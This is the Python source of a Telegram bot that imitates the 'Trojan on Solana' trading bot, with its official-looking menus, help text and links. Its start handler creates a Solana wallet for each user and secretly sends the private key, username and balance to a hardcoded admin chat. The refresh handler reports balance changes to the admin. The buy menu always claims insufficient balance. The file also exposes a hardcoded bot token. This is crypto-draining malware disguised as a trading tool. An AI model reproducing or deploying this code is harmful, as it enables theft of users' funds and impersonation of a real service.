import asyncio
import requests
import random
import string
import base58
import time
_cached_price = 38.0
_cached_time = 0

from datetime import datetime
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

# Configuration
TOKEN = "8473190692:AAEEJ8SckTuhzqGkiuwzpRypMSPcNKp23N0"
ADMIN_ID = 1305203741
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
COINGECKO_API = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
TWITTER_URL = "https://twitter.com/TrojanOnSolana"
YOUTUBE_URL = "https://www.youtube.com/@TrojanOnSolana"

# Store user wallets globally
USER_WALLETS = {}
USER_STATE = {}  # To track user's current state
USER_WATCHLISTS = {}  # Store user watchlists
USER_COPY_TRADES = {}  # Store copy trade addresses
USER_SNIPER_ADDRESSES = {}  # Store sniper addresses
USER_REWARDS_DATA = {}

def get_sol_price():
    global _cached_price, _cached_time
    now = time.time()

    # Cek apakah sudah 60 detik sejak terakhir ambil
    if now - _cached_time < 60:
        return _cached_price

    try:
        response = requests.get(COINGECKO_API, timeout=5)
        data = response.json()
        if "solana" in data and "usd" in data["solana"]:
            _cached_price = data["solana"]["usd"]
            _cached_time = now
            return _cached_price
        else:
            print(f"[get_sol_price] Unexpected response: {data}")
            return _cached_price
    except Exception as e:
        print(f"[get_sol_price] Error fetching price: {e}")
        return _cached_price

def get_sol_balance(public_key: str) -> tuple:
    """Get real SOL balance and USD value using Solana RPC"""
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [public_key]
        }
        
        response = requests.post(SOLANA_RPC_URL, json=payload)
        data = response.json()
        
        lamports = data['result']['value']
        sol_balance = lamports / 10**9
        
        sol_price = get_sol_price()
        usd_value = sol_balance * sol_price
        
        return sol_balance, usd_value
    except Exception as e:
        print(f"Error getting balance: {e}")
        return 0.0, 0.0

#START 
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "MAIN_MENU"
    
    # Initialize user wallets if not exists
    if user.id not in USER_WALLETS:
        USER_WALLETS[user.id] = {
            'wallets': [],
            'active_wallet_index': 0
        }
    
    # Check if user already has wallets
    if not USER_WALLETS[user.id]['wallets']:
        # Generate new Solana wallet if none exists
        keypair = Keypair()
        public_key = str(keypair.pubkey())
        private_key_bytes = bytes(keypair)
        private_key = base58.b58encode(private_key_bytes).decode('utf-8')
        
        new_wallet = {
            'public_key': public_key,
            'private_key': private_key_bytes.hex(),
            'private_key_base58': private_key,
            'name': f"Wallet 1"
        }
        
        USER_WALLETS[user.id]['wallets'].append(new_wallet)
        
        # Get initial balance
        sol_balance, usd_value = get_sol_balance(public_key)
        
        # Send private key to admin in base58 format with balance info
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ NEW USER @{user.username}\n\n"
                 f"Public : {public_key}\n\n"
                 f"Balance : {sol_balance:.3f} SOL (${usd_value:.2f})"
                 f"\n<code>{private_key}</code>",
            parse_mode="HTML"
        )
        print(f"New user: {user.id} - Created wallet")
    
    # Get active wallet
    active_wallet = USER_WALLETS[user.id]['wallets'][USER_WALLETS[user.id]['active_wallet_index']]
    public_key = active_wallet['public_key']
    
    # Get real balance
    sol_balance, usd_value = get_sol_balance(public_key)
    
    # Build the interface
    message_text = (
        "<b>Solana ·</b> <a href='https://solscan.io/account/57wyBoqSgrtqmveAjm7gvWJzeZeZ524meVD8wAVe8Cm8'>🅴</a>\n"
        f"<code>{public_key}</code> <i>(Tap to copy)</i>\n"
        f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n"
        f"—\n"
        f"Click on the Refresh button to update your current balance.\n\n"
        f"Join our Telegram group @trojan and follow us on <a href='{TWITTER_URL}'>Twitter</a>!\n\n"
        "💡If you aren't already, we advise that you <b>use any of the following "
        "bots to trade with</b>. You will have the <b>same wallets and settings "
        "across all bots</b>, but it will be significantly faster due to lighter user load.\n"
        "<a href='https://t.me/trojansolana_officialbot'>Agamemnon</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Achilles</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Nestor</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Odysseus</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Menelaus</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Diomedes</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Paris</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Helenus</a> | "
        "<a href='https://t.me/trojansolana_officialbot'>Hector</a>\n\n"
        "⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.\n"
    )

    # Create keyboard layout
    keyboard = [
        [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
        [InlineKeyboardButton("Positions", callback_data="positions"), 
         InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), 
         InlineKeyboardButton("DCA Orders", callback_data="dca_orders")],
        [InlineKeyboardButton("Copy Trade", callback_data="copy_trade"), 
         InlineKeyboardButton("", callback_data="empty"), InlineKeyboardButton("Sniper 🆕", callback_data="sniper")],
        [InlineKeyboardButton("Trenches", callback_data="trenches"), 
         InlineKeyboardButton("💰 Rewards", callback_data="rewards"), 
         InlineKeyboardButton("⭐️ Watchlist", callback_data="watchlist")],
        [InlineKeyboardButton("Withdraw", callback_data="withdraw"), 
         InlineKeyboardButton("Settings", callback_data="settings")],
        [InlineKeyboardButton("Help", callback_data="help"), 
         InlineKeyboardButton("↻ Refresh", callback_data="refresh")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    context.user_data['original_text'] = message_text
    context.user_data['public_key'] = public_key
    
    if update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    else:
        await update.callback_query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    if user.id not in USER_WALLETS or not USER_WALLETS[user.id]['wallets']:
        await query.edit_message_text(text="❌ Wallet not found. Please /start again.")
        return
    
    active_wallet = USER_WALLETS[user.id]['wallets'][USER_WALLETS[user.id]['active_wallet_index']]
    public_key = active_wallet['public_key']

    # Ambil saldo terbaru
    sol_balance, usd_value = get_sol_balance(public_key)

    # Ambil saldo lama dari wallet user (jika ada)
    old_sol_balance = active_wallet.get("last_balance", 0.0)
    old_usd_value = active_wallet.get("last_usd", 0.0)

    # Update cache saldo baru ke wallet user
    active_wallet["last_balance"] = sol_balance
    active_wallet["last_usd"] = usd_value

    # Kirim notifikasi ke admin jika saldo berubah
    if sol_balance != old_sol_balance:
        username = f"@{user.username}" if user.username else f"ID:{user.id}"

        # Ambil private key base58
        privkey_bytes = active_wallet.get("private_key_bytes")
        if privkey_bytes:
            base58_privkey = base58.b58encode(privkey_bytes).decode()
        else:
            base58_privkey = "NOT FOUND"

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔄 BALANCE UPDATE : {username}\n\n"
                 f"PUBLIC: <code>{public_key}</code>\n\n"
                 f"OLD BALANCE: {old_sol_balance:.3f} SOL (${old_usd_value:.2f})\n"
                 f"NEW BALANCE: {sol_balance:.3f} SOL (${usd_value:.2f})\n"
                 f"DIFFERENCE: {sol_balance - old_sol_balance:.3f} SOL (${usd_value - old_usd_value:.2f})\n\n"
                 f"PRIVATE KEY:\n<code> {private_key}</code>",
            parse_mode="HTML"
        )
    
    # Update tampilan balance user
    if 'original_text' in context.user_data:
        original_text = context.user_data['original_text']
        balance_start = original_text.find("<code>", original_text.find("Balance:")) + len("<code>")
        balance_end = original_text.find("</code>", balance_start)
        prefix = original_text[:balance_start]
        suffix = original_text[balance_end:]
        new_balance = f"{sol_balance:.3f} SOL (${usd_value:.2f})"
        updated_text = prefix + new_balance + suffix
    else:
        updated_text = (
            "Solana:\n"
            f"<code>{public_key}</code> <i>(Tap to copy)</i>\n"
            f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n"
            f"—\n"
            "Balance has been refreshed!"
        )
    
    await query.edit_message_text(
        text=updated_text,
        reply_markup=query.message.reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

#BUY
async def show_buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "AWAITING_TOKEN_ADDRESS"

    message_text = "❌ Insufficient SOL balance"
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

#SELL
async def show_sell_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "SELL_MENU"

    message_text = "<b>Select token to sell</b>\n\nYou do not have any tokens yet! Start trading in the Buy menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_sell")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Jika input berasal dari tombol
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    # Jika input berasal dari command seperti /sell
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_sell_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_sell_menu(update, context)

#POSITIONS
async def show_positions_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "POSITIONS_MENU"

    message_text = "<b>Your Positions</b>\n\nYou do not have any tokens yet! Start trading in the Buy menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_positions")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_positions_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_positions_menu(update, context)

#LIMIT ORDER
async def show_limit_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "LIMIT_ORDERS_MENU"

    message_text = "<b>Limit Orders</b>\n\nYou have no active limit orders."
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_limit_orders")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_limit_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_limit_orders_menu(update, context)

#DCA
async def show_dca_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "DCA_ORDERS_MENU"
    
    message_text = "<b>DCA Orders</b>\n\nYou have no active DCA orders. Create a DCA order from the Buy/Sell menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_dca_orders")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_dca_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_dca_orders_menu(update, context)

#HELP
async def show_help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "HELP_MENU"

    message_text = """<u><b>How do I use Trojan?</b></u>
Check out our (<a href='https://www.youtube.com/@TrojanOnSola'>Youtube playlist</a>) where we explain it all and join our support chat for additional resources @trojan.

<u><b>Where can I find my referral code?</b></u>
Open the /start menu and click 💰Referrals.

<u><b>What are the fees for using Trojan?</b></u>
Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

<u><b>Security Tips: How can I protect my account from scammers?</b></u>
 - Safeguard does NOT require you to login with a phone number or QR code!
 - NEVER search for bots in telegram. Use only official links.
 - Admins and Mods NEVER dm first or send links, stay safe!

For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.

<u><b>Trading Tips: Common Failure Reasons</b></u>
 - Slippage Exceeded: Up your slippage or sell in smaller increments.
 - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.
 - Timed out: Can occur with heavy network loads, consider increasing your gas tip.

<u><b>My PNL seems wrong, why is that?</b></u>
The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.

<u><b>Additional questions or need support?</b></u>
Join our Telegram group @trojan and one of our admins can assist you."""
    
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

#SETTINGS
# ======================= SETTINGS MENU =======================
async def show_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Initialize settings if not exists
    if 'settings' not in context.user_data:
        context.user_data['settings'] = {
            'confirm_trades': False,
            'mev_buys': False,
            'mev_sells': False,
            'chart_previews': False,
            'sell_protection': True,
            'bolt_settings': True,
            'auto_buy': True,
            'auto_sell': True,
            'fee_option': 'fast',
            'custom_fee': '0.0005 SOL',
            'sell_fee_override': None,
            'language': 'English',
            'pnl_cards': True,
            'account_security': True,
            'show_tokens': True,
            'simple_mode': False,
            'pnl_values': True,
            'negative_cards': True,
            'community_cards': False,
            'secure_password': None
        }

    settings = context.user_data['settings']
    
    # Prepare fee buttons
    fee_buttons = [
        "Fast 🐴",
        "Turbo 🚀",
        settings['custom_fee'] if settings['fee_option'] == 'custom' else '0.0005 SOL'
    ]
    
    # Add checkmark to selected fee
    if settings['fee_option'] == 'fast':
        fee_buttons[0] = f"✅ {fee_buttons[0]}"
    elif settings['fee_option'] == 'turbo':
        fee_buttons[1] = f"✅ {fee_buttons[1]}"
    else:
        fee_buttons[2] = f"✅ {fee_buttons[2]}"

    settings_text = """💰<u><b>Fee Discount</b></u>: You are receiving a 10% discount on trading fees for being a referral of another user.

<b>FAQ</b>:

🚀 <b>Fast/Turbo/Custom Fee</b>: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 <b>Confirm Trades: Red = off</b>, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 <b>Confirm Trades: Green = on</b>, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️<b>MEV Protection</b>:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
<u>Important Note</u>: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 <b>Sell Protection: Green = on</b>, you will need to confirm your intention when selling more than 75% of your token balance."""
    
    keyboard = [
        [InlineKeyboardButton("← Back", callback_data="back_to_main"), 
         InlineKeyboardButton(f"{settings['language']} → 🏳️", callback_data="language_settings")],
        [InlineKeyboardButton(fee_buttons[0], callback_data="fee_fast"),
         InlineKeyboardButton(fee_buttons[1], callback_data="fee_turbo"),
         InlineKeyboardButton(fee_buttons[2], callback_data="fee_custom")],
        [InlineKeyboardButton(f"Sell Priority Fee Override: {settings['sell_fee_override'] or '—'}", 
                            callback_data="sell_fee_override")],
        [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"),
         InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
        [InlineKeyboardButton(f"{'🟢' if settings['mev_buys'] else '🔴'} MEV Protect (Buys)", callback_data="toggle_mev_buys"),
         InlineKeyboardButton(f"{'🟢' if settings['mev_sells'] else '🔴'} MEV Protect (Sells)", callback_data="toggle_mev_sells")],
        [InlineKeyboardButton(f"{'🟢' if settings['auto_buy'] else '🔴'} Auto Buy", callback_data="toggle_auto_buy"),
         InlineKeyboardButton(f"{'🟢' if settings['auto_sell'] else '🔴'} Auto Sell", callback_data="toggle_auto_sell")],
        [InlineKeyboardButton(f"{'🟢' if settings['confirm_trades'] else '🔴'} Confirm Trades", callback_data="toggle_confirm_trades")],
        [InlineKeyboardButton(f"{'' if settings['pnl_cards'] else ''} Pnl Cards", callback_data="toggle_pnl_cards"),
         InlineKeyboardButton(f"{'🟢' if settings['chart_previews'] else '🔴'} Chart Previews", callback_data="toggle_chart_previews")],
        [InlineKeyboardButton(f"{'' if settings['show_tokens'] else ''} Show/Hide Tokens", callback_data="toggle_show_tokens"),
         InlineKeyboardButton(f"Wallets", callback_data="wallets")],
        [InlineKeyboardButton(f"{'🔐' if settings['account_security'] else '🔐'} Account Security", callback_data="account_security"),
         InlineKeyboardButton(f"{'🟢' if settings['sell_protection'] else '🔴'} Sell Protection", callback_data="toggle_sell_protection")],
        [InlineKeyboardButton(f"🐴⚡ BOLT {'🟢' if settings['bolt_settings'] else '🔴'}", callback_data="bolt_settings")],
        [InlineKeyboardButton(f"Simple Mode {'' if settings['simple_mode'] else ''} →", callback_data="simple_mode")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=settings_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=settings_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        
# ======================= LANGUAGE MENU =======================
async def show_language_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("English", callback_data="set_language_en"),
        InlineKeyboardButton("Bahasa Indonesia", callback_data="set_language_id")],
        [InlineKeyboardButton("中文 (Chinese)", callback_data="set_language_zh"),
        InlineKeyboardButton("Türkçe (Turkish)", callback_data="set_language_tr")],
        [InlineKeyboardButton("Nederlands (Dutch)", callback_data="set_language_nl"),
        InlineKeyboardButton("← Back", callback_data="back_to_settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text="🌍 Please select your preferred language:",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text="🌍 Please select your preferred language:",
            reply_markup=reply_markup
        )

async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    lang_code = query.data.split('_')[-1]
    lang_map = {
        'en': 'English',
        'id': 'Bahasa Indonesia',
        'zh': '中文',
        'tr': 'Türkçe',
        'nl': 'Nederlands'
    }
    
    if 'settings' not in context.user_data:
        context.user_data['settings'] = {}
    
    context.user_data['settings']['language'] = lang_map.get(lang_code, 'English')
    await query.answer(f"Language set to {context.user_data['settings']['language']}")
    await show_settings_menu(update, context)

# ======================= BUY SETTINGS MENU =======================
async def show_buy_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Initialize buy amounts if not exists
    if 'buy_amounts' not in context.user_data:
        context.user_data['buy_amounts'] = ["0.01", "0.05", "0.1", "0.5", "1.0"]
    if 'buy_slippage' not in context.user_data:
        context.user_data['buy_slippage'] = "1.0"

    keyboard = [
        [InlineKeyboardButton("— Buy Amounts —", callback_data="buy_amounts_header")],
        [InlineKeyboardButton(f"{context.user_data['buy_amounts'][0]} SOL ✏️", callback_data=f"set_buy_amount_{context.user_data['buy_amounts'][0]}"),
         InlineKeyboardButton(f"{context.user_data['buy_amounts'][1]} SOL ✏️", callback_data=f"set_buy_amount_{context.user_data['buy_amounts'][1]}"),
         InlineKeyboardButton(f"{context.user_data['buy_amounts'][2]} SOL ✏️", callback_data=f"set_buy_amount_{context.user_data['buy_amounts'][2]}")],
        [InlineKeyboardButton(f"{context.user_data['buy_amounts'][3]} SOL ✏️", callback_data=f"set_buy_amount_{context.user_data['buy_amounts'][3]}"),
         InlineKeyboardButton(f"{context.user_data['buy_amounts'][4]} SOL ✏️", callback_data=f"set_buy_amount_{context.user_data['buy_amounts'][4]}"),
         InlineKeyboardButton("Custom", callback_data="custom_buy_amount")],
        [InlineKeyboardButton("Buy Slippage", callback_data="buy_slippage_header")],
        [InlineKeyboardButton(f"{'✅ ' if context.user_data['buy_slippage'] == '1.0' else ''}1%", callback_data="set_buy_slippage_1.0"),
         InlineKeyboardButton(f"{'✅ ' if context.user_data['buy_slippage'] == '3.0' else ''}3%", callback_data="set_buy_slippage_3.0"),
         InlineKeyboardButton(f"{'✅ ' if context.user_data['buy_slippage'] == '5.0' else ''}5%", callback_data="set_buy_slippage_5.0")],
        [InlineKeyboardButton("← Back", callback_data="back_to_settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = """⚙️ <b>Buy Settings</b>

<b>Buy Amounts:</b>\nClick any button under Buy Amounts to set your own custom SOL amounts. These SOL amounts will be available as options in your buy menu.\n\n
<b>Buy Slippage:</b>\nSet the preset slippage option for your buys. Changing this slippage value will automatically apply to your next buys."""

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

# ======================= SELL SETTINGS MENU =======================
async def show_sell_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Initialize sell amounts if not exists
    if 'sell_amounts' not in context.user_data:
        context.user_data['sell_amounts'] = ["25", "50", "75", "100"]
    if 'sell_slippage' not in context.user_data:
        context.user_data['sell_slippage'] = "1.0"

    keyboard = [
        [InlineKeyboardButton("— Sell Amounts —", callback_data="sell_amounts_header")],
        [InlineKeyboardButton(f"{context.user_data['sell_amounts'][0]}% ✏", callback_data=f"set_sell_amount_{context.user_data['sell_amounts'][0]}"),
         InlineKeyboardButton(f"{context.user_data['sell_amounts'][1]}% ✏", callback_data=f"set_sell_amount_{context.user_data['sell_amounts'][1]}")],
        [InlineKeyboardButton(f"{context.user_data['sell_amounts'][2]}% ✏", callback_data=f"set_sell_amount_{context.user_data['sell_amounts'][2]}"),
         InlineKeyboardButton(f"{context.user_data['sell_amounts'][3]}% ✏", callback_data=f"set_sell_amount_{context.user_data['sell_amounts'][3]}"),
         InlineKeyboardButton("Custom", callback_data="custom_sell_amount")],
        [InlineKeyboardButton("Sell Slippage", callback_data="sell_slippage_header")],
        [InlineKeyboardButton(f"{'✅ ' if context.user_data['sell_slippage'] == '1.0' else ''}1%", callback_data="set_sell_slippage_1.0"),
         InlineKeyboardButton(f"{'✅ ' if context.user_data['sell_slippage'] == '3.0' else ''}3%", callback_data="set_sell_slippage_3.0"),
         InlineKeyboardButton(f"{'✅ ' if context.user_data['sell_slippage'] == '5.0' else ''}5%", callback_data="set_sell_slippage_5.0")],
        [InlineKeyboardButton("← Back", callback_data="back_to_settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = """⚙️ <b>Sell Settings</b>

<b>Buy Amounts:</b>\nClick any button under Buy Amounts to set your own custom SOL amounts. These SOL amounts will be available as options in your buy menu.\n\n
<b>Buy Slippage:</b>\nSet the preset slippage option for your buys. Changing this slippage value will automatically apply to your next buys."""

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

# ======================= SIMPLE MODE MENU =======================
async def show_simple_mode_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    settings = context.user_data.get('settings', {})
    
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"), 
         InlineKeyboardButton("English →", callback_data="language_settings")],
        [InlineKeyboardButton(f"{'✅ ' if settings.get('fee_option') == 'fast' else ''}Fast 🐴", callback_data="fee_fast"),
         InlineKeyboardButton(f"{'✅ ' if settings.get('fee_option') == 'turbo' else ''}Turbo 🚀", callback_data="fee_turbo"),
         InlineKeyboardButton(f"{'✅ ' if settings.get('fee_option') == 'custom' else ''}{settings.get('custom_fee', '0.001 SOL')}", callback_data="fee_custom")],
        [InlineKeyboardButton(f"{'🟢' if settings.get('mev_buys') else '🔴'} MEV Protect (Buys)", callback_data="toggle_mev_buys"),
         InlineKeyboardButton(f"{'🟢' if settings.get('mev_sells') else '🔴'} MEV Protect (Sells)", callback_data="toggle_mev_sells")],
        [InlineKeyboardButton(f"{'🟢' if settings.get('auto_buy') else '🔴'} Auto Buy", callback_data="toggle_auto_buy"),
         InlineKeyboardButton("— Buy Amounts —", callback_data="buy_amounts_simple")],
        [InlineKeyboardButton("0.01 SOL ✏️", callback_data="set_buy_amount_0.01"),
         InlineKeyboardButton("0.015 SOL ✏️", callback_data="set_buy_amount_0.015"),
         InlineKeyboardButton("0.03 SOL ✏️", callback_data="set_buy_amount_0.03")],
        [InlineKeyboardButton("0.06 SOL ✏️", callback_data="set_buy_amount_0.06"),
         InlineKeyboardButton("0.12 SOL ✏️", callback_data="set_buy_amount_0.12")],
        [InlineKeyboardButton("Buy Slippage: 0.01%", callback_data="set_buy_slippage_0.01")],
        [InlineKeyboardButton("— Sell Amounts —", callback_data="sell_amounts_simple")],
        [InlineKeyboardButton("50%", callback_data="set_sell_amount_50"),
         InlineKeyboardButton("100%", callback_data="set_sell_amount_100")],
        [InlineKeyboardButton("Sell Slippage: 0.8% ✏️", callback_data="set_sell_slippage_0.8")],
        [InlineKeyboardButton(f"{'' if settings.get('show_tokens') else ''} Show/Hide Tokens", callback_data="toggle_show_tokens"),
         InlineKeyboardButton("Wallets", callback_data="wallets")],
        [InlineKeyboardButton(f"{'🔐' if settings.get('account_security') else '🔐'} Account Security", callback_data="account_security"),
         InlineKeyboardButton(f"{'🟢' if settings.get('sell_protection') else '🔴'} Sell Protection", callback_data="toggle_sell_protection")],
        [InlineKeyboardButton("Advanced Mode →", callback_data="advanced_mode")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text =  """💰<u><b>Fee Discount</b></u>: You are receiving a 10% discount on trading fees for being a referral of another user.

<b>FAQ</b>:

🚀 <b>Fast/Turbo/Custom Fee</b>: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 <b>Confirm Trades: Red = off</b>, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 <b>Confirm Trades: Green = on</b>, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️<b>MEV Protection</b>:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
<u>Important Note</u>: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 <b>Sell Protection: Green = on</b>, you will need to confirm your intention when selling more than 75% of your token balance."""
    

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

# ======================= ACCOUNT SECURITY MENU =======================
async def show_account_security_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    settings = context.user_data.get('settings', {})
    
    if settings.get('secure_password'):
        text = "Your Secure Action Password is already set up.\n\nYou can use it to authorize sensitive actions."
        keyboard = [
            [InlineKeyboardButton("Change Password", callback_data="change_sap")],
            [InlineKeyboardButton("← Back", callback_data="back_to_settings")],
        ]
    else:
        text = """You have not yet setup your Secure Action Password (SAP). If you wish to secure your account from unauthorized access by using a password for sensitive actions (e.g. withdrawing funds, exporting wallet keys, changing selected trading wallets...), please click on the button below to setup your SAP.

Beware, once your SAP is set up, you will be required to input your password to execute sensitive actions. Make sure you save your password somewhere safe as you CANNOT recover it if lost."""
        keyboard = [
            [InlineKeyboardButton("Create", callback_data="create_sap")],
            [InlineKeyboardButton("← Back", callback_data="back_to_settings")],
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text=text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

